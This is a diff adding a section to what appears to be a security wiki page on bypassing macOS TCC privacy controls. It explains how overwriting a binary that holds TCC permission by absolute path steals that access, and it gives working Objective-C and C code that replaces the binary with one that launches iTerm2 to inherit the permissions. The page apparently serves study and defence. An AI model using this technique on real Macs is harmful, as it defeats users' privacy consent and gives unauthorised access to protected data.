@@ -30,6 +30,87 @@ asd
 
 The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.
 
+### TCC Absolute Paths
+
+The most common way to give some TCC permission to an application is using the bundle. However, it's also possible to **give access to a binary indicating the absolute path**.\
+The interesting part is that if you can overwrite the binary, you can **steal the access**.
+
+You can use this code to call a binary:
+
+{% tabs %}
+{% tab title="invoker.m" %}
+```
+#import <Foundation/Foundation.h>
+
+// clang -fobjc-arc -framework Foundation invoker.m -o invoker
+
+int main(int argc, const char * argv[]) {
+    @autoreleasepool {
+        // Check if the argument is provided
+        if (argc != 2) {
+            NSLog(@"Usage: %s <path_to_executable>", argv[0]);
+            return 1;
+        }
+
+        // Create a new task
+        NSTask *task = [[NSTask alloc] init];
+
+        // Set the task's launch path to the provided argument
+        [task setLaunchPath:@(argv[1])];
+
+        // Launch the task
+        [task launch];
+
+        // Wait for the task to complete
+        [task waitUntilExit];
+    }
+    return 0;
+}
+```
+{% endtab %}
+
+{% tab title="shell.c" %}
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>  // For execl and fork
+
+// gcc shell.c -o shell
+// mv shell </path/bin/with/TCC>
+
+int main() {
+    pid_t pid = fork();
+
+    if (pid == -1) {
+        // Fork failed
+        perror("fork");
+        return 1;
+    } else if (pid == 0) {
+        // Child process
+        execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);
+
+        // execl only returns if there's an error
+        perror("execl");
+        exit(EXIT_FAILURE);
+    } else {
+        // Parent process
+        int status;
+        waitpid(pid, &status, 0);  // Wait for the child process to finish
+
+        if (WIFEXITED(status)) {
+            // Return the exit status of iTerm2
+            return WEXITSTATUS(status);
+        }
+    }
+
+    return 0;
+}
+```
+{% endtab %}
+{% endtabs %}
+
+
+
 ### SSH Bypass
 
 By default an access via **SSH used to have "Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):
